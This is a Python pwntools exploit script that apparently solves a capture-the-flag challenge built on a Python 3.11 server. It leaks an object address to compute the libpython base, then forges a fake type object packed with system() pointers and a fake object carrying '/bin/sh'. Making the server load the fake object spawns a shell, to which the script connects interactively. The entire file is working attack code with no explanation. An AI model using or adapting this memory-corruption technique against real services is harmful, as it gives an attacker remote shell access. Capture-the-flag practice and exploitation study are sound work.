#!/usr/bin/env python

from pwn import context, ELF, p64, process, remote, sys, u64

context.binary = python = ELF('libpython3.11.so.1.0')


def get_process():
    if len(sys.argv) == 1:
        return process(['./python3.11', 'challenge/server.py'])

    host, port = sys.argv[1].split(':')
    return remote(host, port)


def add(p, inp: bytes) -> int:
    p.sendlineafter(b'Selection:', b'0')
    p.sendlineafter(b'To Add:', inp)
    return int(p.recvline().decode())


def remove(p, addr: int):
    p.sendlineafter(b'Selection:', b'1')
    p.sendlineafter(b'To Remove:', str(addr).encode())


def load(p, addr: int, do_recv: bool = True) -> bytes:
    p.sendlineafter(b'Selection:', b'2')
    p.sendlineafter(b'To Load:', str(addr).encode())
    return p.recvline() if do_recv else b''


def sp64(num: int) -> bytes:
    return ''.join(chr(b) for b in p64(num)).encode()


def main():
    p = get_process()

    p.recvuntil(b'Zero: ')
    zero_addr = int(p.recvline())
    p.info(f'id(0) = {hex(zero_addr)}')

    python.address = zero_addr - 5390984
    p.success(f'Python base address: {hex(python.address)}')

    type_obj = sp64(0xacdc1337) + b'X' * 0x48 + sp64(python.plt.system) * 100

    fake_type_obj_addr = add(p, type_obj)
    fake_obj_addr = add(p, sp64(u64(b'/bin/sh\0') - 2) + sp64(fake_type_obj_addr + 0x48))

    load(p, fake_obj_addr + 0x48, do_recv=False)

    p.interactive()


if __name__ == '__main__':
    main()
